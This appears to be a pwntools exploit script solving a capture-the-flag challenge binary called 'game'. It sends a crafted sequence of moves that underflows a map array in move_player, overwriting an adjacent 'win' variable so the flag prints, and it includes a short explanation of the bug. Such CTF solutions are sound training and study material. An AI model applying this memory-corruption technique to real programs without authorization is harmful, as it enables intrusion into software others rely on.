#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template game
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'game')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x8048000)
# Stripped:   No

ZERO_Y = b'wwww'
SET_X  = b'aaaaaaaa'
WRITE_SPRITE = b'lz'
SOLVE_MAP = b'p'

PAYLOAD = ZERO_Y + SET_X + WRITE_SPRITE + SOLVE_MAP

io = start()

io.info("""the move_player function is vulnerable. by setting the player's x and y strategically, we can underflow the map array when drawing the character sprite. the calculation  here is a little annoying:

&map + (y & 0x4a) + x

to make it easier, we'll just move the char to y=0, then our x offset controls the write more easily.

the "win" var is at &map-4, so all we need to do is:

%s

and we print the flag.""" % PAYLOAD.decode('latin1'))

io.sendline(PAYLOAD)
io.readuntil("flage")
io.interactive()

